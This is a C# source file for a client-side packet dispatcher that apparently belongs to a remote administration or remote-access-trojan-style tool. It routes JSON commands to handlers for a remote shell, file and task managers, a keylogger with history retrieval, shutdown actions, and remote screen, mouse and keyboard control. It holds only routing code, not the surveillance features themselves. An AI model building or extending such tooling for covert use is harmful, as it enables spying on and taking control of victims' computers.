using System;
using System.Diagnostics.Contracts;
using System.Net.WebSockets;
using Common.Enums;
using Common.Networking;
using Common.Utils;

namespace Client.Networking
{
    public sealed class PacketHandler
    {
        private readonly Action<SystemInfoRequest> _onSystemInfoRequest;
        private readonly Action<RemoteShellRequest> _onRemoteShellRequest;
        private readonly Action<FileManagerRequest> _onFileManagerRequest;
        private readonly Action<TaskManagerRequest>? _onTaskManagerRequest;
        private readonly Action<KeyLoggerStart>? _onKeyLoggerStart;
        private readonly Action<KeyLoggerStop>? _onKeyLoggerStop;
        private readonly Action<KeyLoggerLangToggle>? _onKeyLoggerLangToggle;
        private readonly Action<KeyLoggerHistoryRequest>? _onKeyLoggerHistoryRequest;
        private readonly Action<MessageBoxRequest> _onMessageBoxRequest;
        private readonly Action<ShutdownActionRequest> _onShutdownActionRequest;
        private readonly Action<ScreenControlStart>? _onScreenControlStart;
        private readonly Action<ScreenControlStop>? _onScreenControlStop;
        private readonly Action<ScreenControlMouseEvent>? _onScreenControlMouseEvent;
        private readonly Action<ScreenControlKeyboardEvent>? _onScreenControlKeyboardEvent;

        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, 
                             Action<RemoteShellRequest> onRemoteShellRequest, 
                             Action<FileManagerRequest> onFileManagerRequest,
                             Action<MessageBoxRequest> onMessageBoxRequest, 
                             Action<ShutdownActionRequest> onShutdownActionRequest, 
                             Action<KeyLoggerStart>? onKeyLoggerStart = null, 
                             Action<KeyLoggerStop>? onKeyLoggerStop = null, 
                             Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null, 
                             Action<KeyLoggerHistoryRequest>? onKeyLoggerHistoryRequest = null,
                             Action<TaskManagerRequest>? onTaskManagerRequest = null,
                             Action<ScreenControlStart>? onScreenControlStart = null,
                             Action<ScreenControlStop>? onScreenControlStop = null,
                             Action<ScreenControlMouseEvent>? onScreenControlMouseEvent = null,
                             Action<ScreenControlKeyboardEvent>? onScreenControlKeyboardEvent = null)
        {
            _onSystemInfoRequest = onSystemInfoRequest;
            _onRemoteShellRequest = onRemoteShellRequest;
            _onFileManagerRequest = onFileManagerRequest;
            _onTaskManagerRequest = onTaskManagerRequest;
            _onKeyLoggerStart = onKeyLoggerStart;
            _onKeyLoggerStop = onKeyLoggerStop;
            _onKeyLoggerLangToggle = onKeyLoggerLangToggle;
            _onKeyLoggerHistoryRequest = onKeyLoggerHistoryRequest;
            _onMessageBoxRequest = onMessageBoxRequest;
            _onShutdownActionRequest = onShutdownActionRequest;
            _onScreenControlStart = onScreenControlStart;
            _onScreenControlStop = onScreenControlStop;
            _onScreenControlMouseEvent = onScreenControlMouseEvent;
            _onScreenControlKeyboardEvent = onScreenControlKeyboardEvent;
        }

        public void HandleLine(string json)
        {
            try
            {
                var baseObj = JsonHelper.Deserialize<BasePacket>(json);
                if (baseObj == null) return;
                switch (baseObj.PacketType)
                {
                    case PacketType.SystemInfoRequest:
                        var req = JsonHelper.Deserialize<SystemInfoRequest>(json);
                        if (req != null)
                        {
                            _onSystemInfoRequest(req);
                        }
                        break;

                    case PacketType.RemoteShellRequest:
                        var shellReq = JsonHelper.Deserialize<RemoteShellRequest>(json);
                        if (shellReq != null)
                        {
                            _onRemoteShellRequest(shellReq);
                        }
                        break;

                    case PacketType.FileManagerRequest:
                        var fileReq = JsonHelper.Deserialize<FileManagerRequest>(json);
                        if (fileReq != null)
                        {
                            _onFileManagerRequest(fileReq);
                        }
                        break;

                    case PacketType.KeyLoggerStart:
                        var klStart = JsonHelper.Deserialize<KeyLoggerStart>(json);
                        if (klStart != null && _onKeyLoggerStart != null)
                        {
                            _onKeyLoggerStart(klStart);
                        }
                        break;
                    
                    case PacketType.TaskManagerRequest:
                        var taskReq = JsonHelper.Deserialize<TaskManagerRequest>(json);
                        if (taskReq != null && _onTaskManagerRequest != null)
                        {
                            _onTaskManagerRequest(taskReq);
                        }
                        break;

                    case PacketType.KeyLoggerStop:
                        var klStop = JsonHelper.Deserialize<KeyLoggerStop>(json);
                        if (klStop != null && _onKeyLoggerStop != null)
                        {
                            _onKeyLoggerStop(klStop);
                        }
                        break;

                    case PacketType.KeyLoggerLangToggle:
                        var klLang = JsonHelper.Deserialize<KeyLoggerLangToggle>(json);
                        if (klLang != null && _onKeyLoggerLangToggle != null)
                        {
                            _onKeyLoggerLangToggle(klLang);
                        }
                        break;
                    case PacketType.KeyLoggerHistoryRequest:
                        var klHistoryReq = JsonHelper.Deserialize<KeyLoggerHistoryRequest>(json);
                        if (klHistoryReq != null && _onKeyLoggerHistoryRequest != null)
                        {
                            _onKeyLoggerHistoryRequest(klHistoryReq);
                        }
                        break;
                    case PacketType.MessageBoxRequest:
                        var msgReq = JsonHelper.Deserialize<MessageBoxRequest>(json);
                        if (msgReq != null)
                        {
                            _onMessageBoxRequest(msgReq);
                        }
                        break;
                    case PacketType.ShutdownActionRequest:
                        var sdReq = JsonHelper.Deserialize<ShutdownActionRequest>(json);
                        if (sdReq != null)
                        {
                            _onShutdownActionRequest(sdReq);
                        }
                        break;
                    
                    case PacketType.ScreenControlStart:
                        var screenStart = JsonHelper.Deserialize<ScreenControlStart>(json);
                        if (screenStart != null && _onScreenControlStart != null)
                        {
                            _onScreenControlStart(screenStart);
                        }
                        break;
                    
                    case PacketType.ScreenControlStop:
                        var screenStop = JsonHelper.Deserialize<ScreenControlStop>(json);
                        if (screenStop != null && _onScreenControlStop != null)
                        {
                            _onScreenControlStop(screenStop);
                        }
                        break;
                    
                    case PacketType.ScreenControlMouseEvent:
                        var mouseEvent = JsonHelper.Deserialize<ScreenControlMouseEvent>(json);
                        if (mouseEvent != null && _onScreenControlMouseEvent != null)
                        {
                            _onScreenControlMouseEvent(mouseEvent);
                        }
                        break;
                    
                    case PacketType.ScreenControlKeyboardEvent:
                        var keyboardEvent = JsonHelper.Deserialize<ScreenControlKeyboardEvent>(json);
                        if (keyboardEvent != null && _onScreenControlKeyboardEvent != null)
                        {
                            _onScreenControlKeyboardEvent(keyboardEvent);
                        }
                        break;
                    
                    default:
                        break;
                }
            }
            catch (Exception)
            {
                // swallow for now or log via UI
            }
        }
    }
}


